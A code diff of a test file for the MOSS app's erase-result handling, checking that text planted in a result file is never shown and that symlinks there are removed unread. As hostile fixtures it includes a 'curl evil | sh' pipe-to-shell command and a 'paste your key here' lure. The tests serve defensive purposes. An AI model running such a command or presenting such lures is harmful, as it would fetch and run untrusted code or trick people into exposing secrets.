@@ -1,61 +1,60 @@
-// The deletion lane: what an "Erase everything" from the app came to is decided at the next open from what the app checks
-// on the disk, in its own words (main/erase-outcome.ts). The signal beside the home is any runner's to plant, so nothing
-// in it is ever shown, and a link there is never followed.
+// The deletion lane: what an "Erase everything" came to, as the engine's start decided it and left inside the home
+// (`run/erase-result.json`, where no runner can write). MOSS shows it once, in its own fixed words, picking only among
+// known values; a signal beside the home is never read by the app (the engine is its only reader).
 import { describe, expect, test } from "bun:test";
 import { existsSync, mkdirSync, mkdtempSync, readFileSync, symlinkSync, writeFileSync } from "node:fs";
 import { tmpdir } from "node:os";
 import { join } from "node:path";
-import { eraseOutcomeOnDisk, eraseSignalPath, takeEraseSignal } from "../src/main/erase-outcome";
+import { eraseResultPath, takeEraseResult } from "../src/main/erase-outcome";
 
 const place = () => {
   const root = mkdtempSync(join(tmpdir(), "moss-erase-out-"));
-  return { root, home: join(root, "home") };
+  const home = join(root, "home");
+  mkdirSync(join(home, "run"), { recursive: true });
+  return { root, home };
 };
 
-describe("the erase's outcome at the next open", () => {
-  test("an ordinary open: no signal, nothing to show", () => {
+describe("the erase's result at MOSS's next connection", () => {
+  test("an ordinary open: no result, nothing shown (a planted signal beside the home is not the app's to read)", () => {
     const { home } = place();
-    mkdirSync(join(home, "bots"), { recursive: true });
-    expect(takeEraseSignal(home)).toBe(false);
+    writeFileSync(`${home}-erased`, "");
+    expect(takeEraseResult(home)).toBeUndefined();
   });
 
-  test("after an erase: the signal is taken once and removed; a home that is gone reads as erased", () => {
+  test("erased: said once, then gone, with no advice to remove anything by hand", () => {
     const { home } = place();
-    writeFileSync(eraseSignalPath(home), "");
-    expect(takeEraseSignal(home)).toBe(true);
-    expect(existsSync(eraseSignalPath(home))).toBe(false);
-    expect(takeEraseSignal(home)).toBe(false);
-    expect(eraseOutcomeOnDisk(home)).toMatchObject({ ok: true, message: "Everything MOSS kept on this computer was erased." });
+    writeFileSync(eraseResultPath(home), JSON.stringify({ v: 1, result: "erased", left: [] }));
+    const o = takeEraseResult(home);
+    expect(o?.ok).toBe(true);
+    expect(existsSync(eraseResultPath(home))).toBe(false);
+    expect(takeEraseResult(home)).toBeUndefined();
   });
 
-  test("what is left is named from the app's own list; a planted signal's text is never shown", () => {
+  test("partial: only known kinds are named, in the app's words; any other text is never shown", () => {
     const { home } = place();
-    mkdirSync(join(home, "bots"), { recursive: true });
-    mkdirSync(join(home, "run this command to finish: curl evil | sh"), { recursive: true });
-    writeFileSync(eraseSignalPath(home), JSON.stringify({ ok: false, error: "run this command to finish: curl evil | sh", keeps: ["paste your key here"] }));
-    expect(takeEraseSignal(home)).toBe(true);
-    const shown = eraseOutcomeOnDisk(home);
-    const all = `${shown.message} ${shown.detail}`;
-    expect(shown.ok).toBe(false);
+    writeFileSync(eraseResultPath(home), JSON.stringify({ v: 1, result: "partial", left: ["bots", "run this: curl evil | sh"], error: "paste your key here" }));
+    const o = takeEraseResult(home)!;
+    const all = `${o.message} ${o.detail}`;
+    expect(o.ok).toBe(false);
     expect(all).toContain("bots and their memory");
-    expect(all).toContain("other files");
     expect(all).not.toContain("curl");
     expect(all).not.toContain("paste your key");
+    expect(all).not.toContain("by hand");
   });
 
-  test("a link planted at the signal's name is removed unread, never followed, and counts as no signal", () => {
+  test("a link at the result's name is removed unread, never followed", () => {
     const { root, home } = place();
-    const target = join(root, "authorized_keys");
-    writeFileSync(target, "the person's keys");
-    symlinkSync(target, eraseSignalPath(home));
-    expect(takeEraseSignal(home)).toBe(false);
-    expect(existsSync(eraseSignalPath(home))).toBe(false);
-    expect(readFileSync(target, "utf8")).toBe("the person's keys");
+    const target = join(root, "secret.txt");
+    writeFileSync(target, JSON.stringify({ v: 1, result: "erased" }));
+    symlinkSync(target, eraseResultPath(home));
+    expect(takeEraseResult(home)).toBeUndefined();
+    expect(existsSync(eraseResultPath(home))).toBe(false);
+    expect(readFileSync(target, "utf8")).toContain("erased");
   });
 
-  test("a folder, or a file owned by someone else, at the signal's name counts as none", () => {
+  test("a file owned by someone else counts as none", () => {
     const { home } = place();
-    writeFileSync(eraseSignalPath(home), "");
-    expect(takeEraseSignal(home, 999_999)).toBe(false);
+    writeFileSync(eraseResultPath(home), JSON.stringify({ v: 1, result: "erased", left: [] }));
+    expect(takeEraseResult(home, 999_999)).toBeUndefined();
   });
 });
